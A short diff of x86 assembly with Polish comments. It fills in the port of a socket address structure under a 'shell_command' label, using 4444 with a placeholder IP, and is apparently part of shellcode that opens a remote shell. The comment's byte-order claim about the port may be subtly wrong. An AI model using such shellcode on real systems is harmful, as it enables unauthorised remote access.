@@ -44,6 +44,6 @@ shell_command:
 align 16
 sockaddr:
   dw 2                              ; family = AF_INET
-  dw 0x<port>                         ; numer portu 0x115c = 4444
+  dw 0x115c                         ; numer portu 0x115c = 4444
   db <ip>                   ; adres IPv4 127.0.0.1
   dq 0                              ; wypełnienie
